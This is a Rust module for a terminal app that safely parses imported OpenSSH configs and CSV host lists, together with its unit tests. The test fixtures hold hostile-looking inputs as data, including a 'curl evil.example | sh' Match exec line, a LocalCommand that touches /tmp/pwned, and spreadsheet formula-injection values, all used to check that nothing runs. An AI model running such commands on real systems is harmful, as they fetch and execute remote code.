//! Import parsers (Phase 04). Both are declarative and non-executing: the text is read as data,
//! nothing in it is run, included or followed, and every value goes through the same validation
//! as a host typed into the editor. Parsing produces a preview; nothing is written until the user
//! confirms it, and then in one transaction.

use tyrminal_contracts::limits::{MAX_IMPORT_HOSTS, MAX_IMPORT_LEN, MAX_IMPORT_LINE_LEN};
use tyrminal_contracts::{ImportHost, ImportSkipped, IpcError};

use crate::error::invalid;
use crate::validate;

/// Skipped lines reported in one preview; more are summarized in a final entry.
const MAX_SKIPPED: usize = 500;

#[derive(Default)]
pub(crate) struct Parsed {
    pub hosts: Vec<ImportHost>,
    pub skipped: Vec<ImportSkipped>,
}

impl Parsed {
    fn skip(&mut self, line: usize, text: &str, reason: &str) {
        if self.skipped.len() < MAX_SKIPPED {
            let mut shown: String = text.chars().filter(|c| !c.is_control()).take(120).collect();
            if text.chars().count() > 120 {
                shown.push('…');
            }
            self.skipped.push(ImportSkipped { line: line as u32, text: shown, reason: reason.to_owned() });
        } else if self.skipped.len() == MAX_SKIPPED {
            self.skipped.push(ImportSkipped {
                line: 0,
                text: String::new(),
                reason: "More lines were skipped.".into(),
            });
        }
    }
}

fn check_size(text: &str) -> Result<(), IpcError> {
    if text.len() > MAX_IMPORT_LEN {
        return Err(invalid("The file is too large to import (1 MiB at most)."));
    }
    Ok(())
}

/// Validates one candidate host the same way the host editor does. `Err` carries the reason.
fn checked(mut host: ImportHost) -> Result<ImportHost, String> {
    let message = |e: IpcError| e.message;
    host.label = validate::label(&host.label).map_err(message)?;
    host.address = validate::address(&host.address).map_err(message)?;
    host.port = validate::port(host.port).map_err(message)?;
    if !host.username.is_empty() {
        host.username = validate::username(&host.username).map_err(message)?;
    }
    host.group = validate::folder(&host.group).map_err(message)?;
    if host.group.split('/').any(|segment| validate::label(segment).is_err() && !segment.is_empty()) {
        return Err("The group name is not valid.".into());
    }
    host.tags = validate::tags(&host.tags).map_err(message)?;
    Ok(host)
}

/// Validates a previewed host again when it comes back from the renderer to be imported.
pub(crate) fn revalidate(host: ImportHost) -> Result<ImportHost, IpcError> {
    checked(ImportHost { notes: Vec::new(), ..host })
        .map_err(|_| invalid("An imported host is not valid. Preview the file again."))
}

// ---------- OpenSSH client configuration ----------

/// Directives that run programs, read other files or open listeners. They are never acted on;
/// the preview names them so the user knows what was left out.
const NOT_IMPORTED: &[(&str, &str)] = &[
    ("proxycommand", "runs a command; not imported (commands from imported files are never run)"),
    ("localcommand", "runs a command; not imported (commands from imported files are never run)"),
    ("permitlocalcommand", "allows local commands; not imported"),
    ("knownhostscommand", "runs a command; not imported (commands from imported files are never run)"),
    ("remotecommand", "runs a command on the server; not imported"),
    ("include", "reads other files; not followed"),
    ("proxyjump", "jump hosts are not imported yet"),
    ("localforward", "port forwarding is not imported yet"),
    ("remoteforward", "port forwarding is not imported yet"),
    ("dynamicforward", "port forwarding is not imported yet"),
    ("forwardagent", "agent forwarding stays off in Tyrminal"),
    ("forwardx11", "X11 forwarding is not supported"),
    ("forwardx11trusted", "X11 forwarding is not supported"),
];

/// Options read from a block: first value wins, as in OpenSSH.
#[derive(Default, Clone)]
struct Options {
    host_name: Option<String>,
    port: Option<String>,
    user: Option<String>,
    identity_file: Option<String>,
}

struct Block {
    patterns: Vec<String>,
    options: Options,
}

/// Splits a configuration line into keyword and arguments (`Key value`, `Key=value`, quoted
/// arguments). `None` for blank lines and comments.
fn split_line(line: &str) -> Option<(String, Vec<String>)> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return None;
    }
    let (keyword, rest) = match trimmed.find(|c: char| c.is_whitespace() || c == '=') {
        Some(i) => (&trimmed[..i], trimmed[i..].trim_start().trim_start_matches('=').trim_start()),
        None => (trimmed, ""),
    };
    let mut args = Vec::new();
    let mut current = String::new();
    let mut quoted = false;
    let mut has = false;
    for c in rest.chars() {
        match c {
            '"' => {
                quoted = !quoted;
                has = true;
            }
            c if c.is_whitespace() && !quoted => {
                if has {
                    args.push(std::mem::take(&mut current));
                    has = false;
                }
            }
            c => {
                current.push(c);
                has = true;
            }
        }
    }
    if has {
        args.push(current);
    }
    Some((keyword.to_lowercase(), args))
}

/// OpenSSH pattern matching: `*` any run, `?` one character, case-insensitive.
fn glob(pattern: &str, text: &str) -> bool {
    fn go(p: &[char], t: &[char]) -> bool {
        match (p.first(), t.first()) {
            (None, None) => true,
            (Some('*'), _) => go(&p[1..], t) || (!t.is_empty() && go(p, &t[1..])),
            (Some('?'), Some(_)) => go(&p[1..], &t[1..]),
            (Some(a), Some(b)) => a == b && go(&p[1..], &t[1..]),
            _ => false,
        }
    }
    let p: Vec<char> = pattern.to_lowercase().chars().collect();
    let t: Vec<char> = text.to_lowercase().chars().collect();
    go(&p, &t)
}

/// Whether a `Host` pattern list applies to `alias`: some positive pattern matches and no
/// negated one does.
fn applies(patterns: &[String], alias: &str) -> bool {
    let mut matched = false;
    for pattern in patterns {
        if let Some(negated) = pattern.strip_prefix('!') {
            if glob(negated, alias) {
                return false;
            }
        } else if glob(pattern, alias) {
            matched = true;
        }
    }
    matched
}

fn is_pattern(alias: &str) -> bool {
    alias.contains(['*', '?', '!'])
}

pub(crate) fn parse_openssh(text: &str) -> Result<Parsed, IpcError> {
    check_size(text)?;
    let mut out = Parsed::default();
    // Options before the first Host line apply to every host.
    let mut blocks = vec![Block { patterns: vec!["*".into()], options: Options::default() }];
    let mut aliases: Vec<(usize, String)> = Vec::new();
    let mut in_match = false;

    for (index, line) in text.lines().enumerate() {
        let number = index + 1;
        if line.len() > MAX_IMPORT_LINE_LEN {
            out.skip(number, line, "line is too long");
            continue;
        }
        let Some((keyword, args)) = split_line(line) else { continue };
        match keyword.as_str() {
            "host" => {
                in_match = false;
                if args.is_empty() {
                    out.skip(number, line, "Host line without a name");
                }
                for alias in &args {
                    if !is_pattern(alias) && !aliases.iter().any(|(_, a)| a.eq_ignore_ascii_case(alias)) {
                        aliases.push((number, alias.clone()));
                    }
                }
                blocks.push(Block { patterns: args, options: Options::default() });
            }
            "match" => {
                // Conditions such as `exec` cannot be evaluated without running something.
                in_match = true;
                out.skip(number, line, "Match blocks are not imported (their conditions can run commands)");
            }
            _ if in_match => out.skip(number, line, "inside a Match block; not imported"),
            _ => {
                if let Some((_, reason)) = NOT_IMPORTED.iter().find(|(k, _)| *k == keyword) {
                    out.skip(number, line, reason);
                    continue;
                }
                let Some(block) = blocks.last_mut() else { continue };
                if matches!(keyword.as_str(), "hostname" | "port" | "user") && args.len() != 1 {
                    // OpenSSH rejects these too ("garbage at end of line").
                    out.skip(number, line, "expects exactly one value; not imported");
                    continue;
                }
                let value = args.first().cloned();
                let slot = match keyword.as_str() {
                    "hostname" => &mut block.options.host_name,
                    "port" => &mut block.options.port,
                    "user" => &mut block.options.user,
                    "identityfile" => &mut block.options.identity_file,
                    // Everything else (ciphers, timeouts, ...) is left to Tyrminal's own defaults.
                    _ => continue,
                };
                if slot.is_none() {
                    *slot = value;
                }
            }
        }
    }

    if aliases.len() > MAX_IMPORT_HOSTS {
        return Err(invalid("The file defines more hosts than one import allows (10,000)."));
    }
    for (line, alias) in aliases {
        let mut options = Options::default();
        for block in blocks.iter().filter(|b| applies(&b.patterns, &alias)) {
            options.host_name = options.host_name.or_else(|| block.options.host_name.clone());
            options.port = options.port.or_else(|| block.options.port.clone());
            options.user = options.user.or_else(|| block.options.user.clone());
            options.identity_file = options.identity_file.or_else(|| block.options.identity_file.clone());
        }
        let address = options.host_name.unwrap_or_else(|| alias.clone()).replace("%h", &alias);
        if address.contains('%') {
            out.skip(line, &format!("Host {alias}"), "HostName uses a token that is not supported");
            continue;
        }
        let port = match options.port.as_deref().map(str::parse::<u16>) {
            None => 22,
            Some(Ok(port)) => port,
            Some(Err(_)) => {
                out.skip(line, &format!("Host {alias}"), "Port is not a number from 1 to 65535");
                continue;
            }
        };
        let mut notes = Vec::new();
        if let Some(identity) = options.identity_file {
            notes.push(format!(
                "Uses the key file {identity}, which was not imported. Import that key in the keychain and choose it for this host."
            ));
        }
        let candidate = ImportHost {
            label: alias.clone(),
            address,
            port,
            username: options.user.unwrap_or_default(),
            group: String::new(),
            tags: Vec::new(),
            notes,
        };
        match checked(candidate) {
            Ok(host) => out.hosts.push(host),
            Err(reason) => out.skip(line, &format!("Host {alias}"), &reason),
        }
    }
    Ok(out)
}

// ---------- CSV ----------

/// RFC 4180 records: quoted fields may contain commas, quotes (doubled) and newlines.
fn csv_records(text: &str) -> Result<Vec<(usize, Vec<String>)>, IpcError> {
    let mut records = Vec::new();
    let mut record = Vec::new();
    let mut field = String::new();
    let mut quoted = false;
    let mut line = 1usize;
    let mut start_line = 1usize;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        if quoted {
            match c {
                '"' if chars.peek() == Some(&'"') => {
                    chars.next();
                    field.push('"');
                }
                '"' => quoted = false,
                c => {
                    if c == '\n' {
                        line += 1;
                    }
                    field.push(c);
                }
            }
            continue;
        }
        match c {
            '"' if field.is_empty() => quoted = true,
            ',' => record.push(std::mem::take(&mut field)),
            '\r' => {}
            '\n' => {
                record.push(std::mem::take(&mut field));
                if record.iter().any(|f| !f.is_empty()) {
                    records.push((start_line, std::mem::take(&mut record)));
                }
                record.clear();
                line += 1;
                start_line = line;
            }
            c => field.push(c),
        }
        if field.len() > MAX_IMPORT_LINE_LEN {
            return Err(invalid("The file has a value that is too long."));
        }
    }
    if quoted {
        return Err(invalid("The file has a quote that is never closed."));
    }
    record.push(field);
    if record.iter().any(|f| !f.is_empty()) {
        records.push((start_line, record));
    }
    Ok(records)
}

const CSV_COLUMNS: [&str; 6] = ["label", "address", "port", "username", "group", "tags"];

/// CSV with a header row naming any of: label, address, port, username, group, tags (tags
/// separated by `;`). Values are data: a leading `=`, `+`, `-` or `@` is kept as text and never
/// evaluated.
pub(crate) fn parse_csv(text: &str) -> Result<Parsed, IpcError> {
    check_size(text)?;
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let records = csv_records(text)?;
    let mut out = Parsed::default();
    let Some(((_, header), rows)) = records.split_first() else {
        return Ok(out);
    };
    let mut column = [None; 6];
    for (index, name) in header.iter().enumerate() {
        let name = name.trim().to_lowercase();
        match CSV_COLUMNS.iter().position(|c| *c == name) {
            Some(slot) => column[slot] = Some(index),
            None => out.skip(1, &name, "unknown column; ignored"),
        }
    }
    if column[1].is_none() {
        return Err(invalid("The CSV needs a header row with at least an \"address\" column."));
    }
    if rows.len() > MAX_IMPORT_HOSTS {
        return Err(invalid("The file has more rows than one import allows (10,000)."));
    }
    for (line, row) in rows {
        let get = |slot: usize| column[slot].and_then(|i| row.get(i)).map(|v| v.trim().to_owned()).unwrap_or_default();
        let address = get(1);
        let port = match get(2).as_str() {
            "" => 22,
            text => match text.parse::<u16>() {
                Ok(port) => port,
                Err(_) => {
                    out.skip(*line, &row.join(","), "port is not a number from 1 to 65535");
                    continue;
                }
            },
        };
        let label = match get(0) {
            empty if empty.is_empty() => address.clone(),
            label => label,
        };
        let candidate = ImportHost {
            label,
            address,
            port,
            username: get(3),
            group: get(4),
            tags: get(5).split(';').map(str::to_owned).collect(),
            notes: Vec::new(),
        };
        match checked(candidate) {
            Ok(host) => out.hosts.push(host),
            Err(reason) => out.skip(*line, &row.join(","), &reason),
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    const CONFIG: &str = r#"
# Global defaults
User fallback
ServerAliveInterval 30
Include ~/.ssh/other_config

Host web-1 web-2
    HostName %h.internal.example
    Port 2222

Host db
    HostName=10.0.0.5
    User "dbadmin"
    IdentityFile ~/.ssh/id_db
    ProxyCommand nc -X 5 %h %p
    LocalCommand touch /tmp/pwned

Host *.wildcard !bad
    Port 2200

Host bastion
    ProxyJump jump.example
    Port notanumber

Match exec "curl evil.example | sh"
    User root

Host evil
    HostName bad host name
"#;

    #[test]
    fn openssh_config_is_read_as_data_and_never_executed() {
        let parsed = parse_openssh(CONFIG).unwrap();
        let labels: Vec<&str> = parsed.hosts.iter().map(|h| h.label.as_str()).collect();
        assert_eq!(labels, ["web-1", "web-2", "db", "evil"]);
        let web = &parsed.hosts[0];
        assert_eq!(
            (web.address.as_str(), web.port, web.username.as_str()),
            ("web-1.internal.example", 2222, "fallback")
        );
        let db = &parsed.hosts[2];
        assert_eq!(
            (db.address.as_str(), db.port, db.username.as_str()),
            ("10.0.0.5", 22, "fallback"),
            "the first value wins, so the global User applies"
        );
        assert!(db.notes[0].contains("~/.ssh/id_db"), "identity files are named, never read");

        let reasons: Vec<String> = parsed.skipped.iter().map(|s| format!("{}: {}", s.line, s.reason)).collect();
        let has = |needle: &str| reasons.iter().any(|r| r.contains(needle));
        assert!(has("runs a command"), "{reasons:?}");
        assert!(has("Match blocks are not imported"), "{reasons:?}");
        assert!(has("inside a Match block"), "{reasons:?}");
        assert!(has("not followed"), "{reasons:?}");
        assert!(has("jump hosts"), "{reasons:?}");
        assert!(has("Port is not a number"), "{reasons:?}");
        // A HostName with extra values is reported and ignored; the alias is the address, as in ssh.
        assert!(has("expects exactly one value"), "{reasons:?}");
        assert_eq!(parsed.hosts[3].address, "evil");
    }

    #[test]
    fn openssh_patterns_and_negation_apply_like_ssh() {
        assert!(applies(&["*.example".into()], "a.example"));
        assert!(!applies(&["*.example".into(), "!b.example".into()], "b.example"));
        assert!(applies(&["db?".into()], "DB1"));
        assert!(!applies(&["!x".into()], "y"), "a list with only negations matches nothing");
    }

    #[test]
    fn csv_keeps_formula_like_values_as_text_and_reports_bad_rows() {
        let csv = "\u{feff}Label,Address,Port,Username,Group,Tags,Extra\n\
                   \"=HYPERLINK(\"\"http://x\"\")\",web.example,22,deploy,Prod/Web,prod;linux,x\n\
                   +cmd,10.0.0.1,,,,,\n\
                   bad port,10.0.0.2,99999,,,,\n\
                   \"quoted, comma\",10.0.0.3,2222,me,,,\n\
                   evil,\"bad host\",22,,,,\n";
        let parsed = parse_csv(csv).unwrap();
        let labels: Vec<&str> = parsed.hosts.iter().map(|h| h.label.as_str()).collect();
        assert_eq!(labels, ["=HYPERLINK(\"http://x\")", "+cmd", "quoted, comma"]);
        assert_eq!(parsed.hosts[0].group, "Prod/Web");
        assert_eq!(parsed.hosts[0].tags, ["linux", "prod"]);
        assert_eq!(parsed.hosts[1].port, 22);
        assert!(parsed.skipped.iter().any(|s| s.reason.contains("unknown column")));
        assert!(parsed.skipped.iter().any(|s| s.reason.contains("port")));
        assert_eq!(parsed.skipped.iter().filter(|s| s.line > 1).count(), 2);
    }

    #[test]
    fn malformed_and_oversized_input_is_refused() {
        assert!(parse_csv("address\n\"unterminated\n").is_err());
        assert!(parse_csv("label,port\nx,22\n").is_err(), "an address column is required");
        assert!(parse_openssh(&"#".repeat(MAX_IMPORT_LEN + 1)).is_err());
        assert!(parse_csv("").unwrap().hosts.is_empty());
        let long = format!("Host x\n  HostName {}\n", "a".repeat(MAX_IMPORT_LINE_LEN + 1));
        let parsed = parse_openssh(&long).unwrap();
        assert_eq!(parsed.hosts[0].address, "x", "an over-long line is skipped, not truncated into a value");
        assert!(parsed.skipped.iter().any(|s| s.reason.contains("too long")));
    }
}
